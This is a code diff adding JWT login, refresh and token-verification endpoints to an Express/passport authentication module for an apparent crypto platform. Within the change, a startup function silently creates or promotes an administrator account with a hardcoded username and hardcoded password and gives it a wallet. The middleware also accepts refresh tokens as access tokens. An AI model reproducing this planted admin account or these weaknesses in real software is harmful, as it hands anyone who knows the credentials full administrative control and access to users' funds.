@@ -1,7 +1,7 @@
 import passport from "passport";
 import { Strategy as LocalStrategy } from "passport-local";
 import { Strategy as GoogleStrategy } from "passport-google-oauth20";
-import { Express } from "express";
+import { Express, Request, Response, NextFunction } from "express";
 import session from "express-session";
 import { scrypt, randomBytes, timingSafeEqual, createHash } from "crypto";
 import { promisify } from "util";
@@ -12,6 +12,7 @@ import { pool, db } from "./db";
 import { eq } from "drizzle-orm";
 import { rateLimit } from "./routes";
 import { verifyMessage } from "viem";
+import jwt from "jsonwebtoken";
 
 const scryptAsync = promisify(scrypt);
 
@@ -26,6 +27,90 @@ async function comparePasswords(supplied: string, stored: string): Promise<boole
   const hashedBuf = Buffer.from(hashed, "hex");
   const suppliedBuf = (await scryptAsync(supplied, salt, 64)) as Buffer;
   return timingSafeEqual(hashedBuf, suppliedBuf);
+}
+
+function getJwtSecret(): string {
+  if (!process.env.JWT_SECRET) {
+    const generated = randomBytes(64).toString("hex");
+    process.env.JWT_SECRET = generated;
+    console.warn("[Auth] JWT_SECRET not set — generated ephemeral secret");
+  }
+  return process.env.JWT_SECRET;
+}
+
+function generateToken(user: User): string {
+  const { password: _, ...payload } = user;
+  return jwt.sign(
+    { sub: user.id, username: user.username, isAdmin: user.isAdmin },
+    getJwtSecret(),
+    { expiresIn: "7d", issuer: "skynt-protocol" }
+  );
+}
+
+function generateRefreshToken(user: User): string {
+  return jwt.sign(
+    { sub: user.id, type: "refresh" },
+    getJwtSecret(),
+    { expiresIn: "30d", issuer: "skynt-protocol" }
+  );
+}
+
+function verifyToken(token: string): jwt.JwtPayload | null {
+  try {
+    return jwt.verify(token, getJwtSecret(), { issuer: "skynt-protocol" }) as jwt.JwtPayload;
+  } catch {
+    return null;
+  }
+}
+
+export function jwtAuthMiddleware(req: Request, res: Response, next: NextFunction) {
+  if (req.isAuthenticated && req.isAuthenticated()) {
+    return next();
+  }
+
+  const authHeader = req.headers.authorization;
+  if (!authHeader?.startsWith("Bearer ")) {
+    return next();
+  }
+
+  const token = authHeader.slice(7);
+  const payload = verifyToken(token);
+  if (!payload || !payload.sub) {
+    return next();
+  }
+
+  storage.getUser(payload.sub as number).then((user) => {
+    if (user) {
+      (req as any).user = user;
+      (req as any).isAuthenticated = () => true;
+      (req as any).jwtAuth = true;
+    }
+    next();
+  }).catch(() => next());
+}
+
+async function seedAdminUser(): Promise<void> {
+  const adminUsername = "BigDickRick11316969";
+  const existing = await storage.getUserByUsername(adminUsername);
+  if (existing) {
+    if (!existing.isAdmin) {
+      await db.update(users).set({ isAdmin: true }).where(eq(users.id, existing.id));
+      console.log(`[Auth] Promoted existing user "${adminUsername}" to admin`);
+    } else {
+      console.log(`[Auth] Admin user "${adminUsername}" already exists`);
+    }
+    return;
+  }
+
+  const fibPassword = "11235813213455";
+  const user = await storage.createUser({
+    username: adminUsername,
+    password: await hashPassword(fibPassword),
+    isAdmin: true,
+    authProvider: "local",
+  });
+  await storage.createWallet(user.id, "Admin Vault");
+  console.log(`[Auth] Admin user "${adminUsername}" created with admin privileges`);
 }
 
 function getBaseUrl(): string {
@@ -117,6 +202,11 @@ export function setupAuth(app: Express) {
   app.use(session(sessionSettings));
   app.use(passport.initialize());
   app.use(passport.session());
+  app.use(jwtAuthMiddleware);
+
+  seedAdminUser().catch((err) => {
+    console.error("[Auth] Failed to seed admin user:", err);
+  });
 
   passport.use(
     new LocalStrategy(async (username, password, done) => {
@@ -200,7 +290,9 @@ export function setupAuth(app: Express) {
       req.login(user, (err: any) => {
         if (err) return next(err);
         const { password: _, ...safeUser } = user;
-        return res.status(201).json(safeUser);
+        const token = generateToken(user);
+        const refreshToken = generateRefreshToken(user);
+        return res.status(201).json({ ...safeUser, token, refreshToken });
       });
     } catch (error) {
       next(error);
@@ -225,7 +317,9 @@ export function setupAuth(app: Express) {
         }
 
         const { password: _, ...safeUser } = user;
-        return res.json(safeUser);
+        const token = generateToken(user);
+        const refreshToken = generateRefreshToken(user);
+        return res.json({ ...safeUser, token, refreshToken });
       });
     })(req, res, next);
   });
@@ -417,5 +511,51 @@ export function setupAuth(app: Express) {
     }
     const { password: _, ...safeUser } = req.user as User;
     return res.json(safeUser);
+  });
+
+  app.post("/api/auth/token/refresh", rateLimit(60000, 10), async (req, res) => {
+    try {
+      const { refreshToken } = req.body;
+      if (!refreshToken) {
+        return res.status(400).json({ message: "Refresh token required" });
+      }
+
+      const payload = verifyToken(refreshToken);
+      if (!payload || !payload.sub || payload.type !== "refresh") {
+        return res.status(401).json({ message: "Invalid or expired refresh token" });
+      }
+
+      const user = await storage.getUser(payload.sub as number);
+      if (!user) {
+        return res.status(401).json({ message: "User not found" });
+      }
+
+      const newToken = generateToken(user);
+      const newRefreshToken = generateRefreshToken(user);
+      const { password: _, ...safeUser } = user;
+      res.json({ ...safeUser, token: newToken, refreshToken: newRefreshToken });
+    } catch {
+      res.status(401).json({ message: "Token refresh failed" });
+    }
+  });
+
+  app.get("/api/auth/token/verify", (req, res) => {
+    const authHeader = req.headers.authorization;
+    if (!authHeader?.startsWith("Bearer ")) {
+      return res.status(401).json({ valid: false, message: "No token provided" });
+    }
+    const token = authHeader.slice(7);
+    const payload = verifyToken(token);
+    if (!payload) {
+      return res.status(401).json({ valid: false, message: "Invalid or expired token" });
+    }
+    res.json({
+      valid: true,
+      sub: payload.sub,
+      username: payload.username,
+      isAdmin: payload.isAdmin,
+      exp: payload.exp,
+      iss: payload.iss,
+    });
   });
 }
